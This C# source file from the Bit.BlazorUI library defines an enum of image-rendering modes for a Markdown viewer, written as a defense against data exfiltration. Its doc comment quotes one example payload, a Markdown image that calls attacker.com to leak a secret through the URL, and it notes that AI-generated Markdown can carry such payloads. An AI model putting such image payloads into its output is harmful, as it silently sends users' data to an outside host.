namespace Bit.BlazorUI;

/// <summary>
/// Controls how the <see cref="BitMarkdownViewer"/> handles image sources, primarily as a
/// defense against data-exfiltration attacks. A remote image such as
/// <c>![x](https://attacker.com/leak?data=SECRET)</c> is fetched automatically by the
/// browser the moment it is rendered, silently leaking whatever the attacker encodes into
/// the URL (and the page URL via the referrer header) without any user interaction.
/// </summary>
public enum BitMarkdownViewerImageRendering
{
    /// <summary>
    /// All images are rendered and loaded automatically, including remote ones.
    /// Suitable only when the Markdown source is fully trusted.
    /// </summary>
    All,

    /// <summary>
    /// Only same-origin images (relative paths, anchors and same-document references) are
    /// loaded. Remote images (<c>http:</c>, <c>https:</c> and protocol-relative <c>//</c>)
    /// are blocked so they cannot trigger automatic cross-origin requests. The alt text is
    /// still rendered. This is the recommended mode for untrusted or AI-generated Markdown.
    /// </summary>
    SameOrigin,

    /// <summary>
    /// No image is allowed to load; every image source is stripped and only the alt text
    /// remains. The strictest option.
    /// </summary>
    None
}
